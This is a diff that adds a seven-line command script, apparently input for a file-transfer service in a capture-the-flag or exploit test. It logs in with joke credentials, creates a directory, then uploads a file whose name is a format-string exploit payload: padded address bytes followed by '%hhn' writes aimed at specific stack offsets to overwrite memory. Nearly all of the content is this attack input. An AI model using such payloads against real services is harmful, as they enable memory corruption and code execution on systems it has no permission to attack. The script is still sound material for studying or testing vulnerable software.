@@ -1,0 +1,7 @@
+login Acidburn
+pass CrashOverride
+mkdir aa
+cd aa
+put pXVAAAApXVAAAApXVAAAApXV%053c%92$hhn%01c%94$hhn%017c%96$hhn%091c%98$hhn 1
+grep .
+exit
